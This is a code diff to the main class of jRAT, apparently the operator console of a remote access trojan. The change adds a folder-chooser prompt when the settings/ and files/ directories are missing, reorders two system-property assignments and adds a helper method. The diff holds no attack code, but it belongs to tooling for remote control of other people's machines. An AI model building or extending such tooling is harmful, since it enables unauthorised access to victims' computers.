@@ -1,8 +1,11 @@
 package com.redpois0n;
 
+import java.io.File;
 import java.util.ArrayList;
 import java.util.List;
 
+import javax.swing.JFileChooser;
+import javax.swing.JOptionPane;
 import javax.swing.UIManager;
 
 import pro.jrat.api.events.OnDisableEvent;
@@ -32,9 +35,6 @@ public class Main {
 			System.setProperty("apple.laf.useScreenMenuBar", "true");
 		}
 		
-		System.setProperty("jrat.dir", System.getProperty("user.dir"));
-		System.setProperty("jrat.version", Version.getVersion());
-		
 		try {
 			Theme.getGlobal().load();
 			UIManager.setLookAndFeel(Theme.getGlobal().getTheme());
@@ -43,6 +43,22 @@ public class Main {
 			ex.printStackTrace();
 			UIManager.setLookAndFeel(UIManager.getSystemLookAndFeelClassName());
 		}
+		
+		if (isRunningFromHomeDir()) {
+			JOptionPane.showMessageDialog(null, "Could not find /settings/ or /files/, please specify your jRAT directory", "jRAT", JOptionPane.WARNING_MESSAGE);
+			JFileChooser chooser = new JFileChooser();
+			chooser.setFileSelectionMode(JFileChooser.DIRECTORIES_ONLY);
+			chooser.showOpenDialog(null);
+			
+			File file = chooser.getSelectedFile();
+			
+			if (file != null) {
+				System.setProperty("user.dir", file.getAbsolutePath());
+			}
+		}
+		
+		System.setProperty("jrat.dir", System.getProperty("user.dir"));
+		System.setProperty("jrat.version", Version.getVersion());
 		
 		try {
 			PluginLoader.loadAPI();
@@ -119,6 +135,10 @@ public class Main {
 
 	public static String formatTitle() {
 		return "jRAT [" + connections.size() + "] BETA " + Version.getVersion();
+	}
+	
+	public static boolean isRunningFromHomeDir() {
+		return !new File("settings/").exists() || !new File("files/").exists();
 	}
 
 }
